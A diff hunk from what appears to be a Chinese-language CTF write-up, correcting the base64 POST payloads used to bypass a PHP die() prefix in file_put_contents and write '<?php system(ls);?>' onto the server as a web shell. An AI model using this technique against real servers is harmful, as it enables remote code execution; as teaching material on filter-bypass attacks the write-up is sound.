@@ -160,8 +160,8 @@ file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
 POST传递：
 ```
 content=<?php system(ls);?>   //base64编码—下
-content=PD9waHAgc3lzdGVtKCdscycp0z8+
-content=aaPD9waHAgc3lzdGVtKCdscycp0z8+ //加两个字符
+content=PD9waHAgc3lzdGVtKGxzKTs/Pg==
+content=aaPD9waHAgc3lzdGVtKGxzKTs/Pg== //加两个字符
 //<?php die('大佬别秀了');?>被base64过滤后变成phpdie，加两个字符变成4的倍数。
 ```
 访问jiuzhen.php即可。
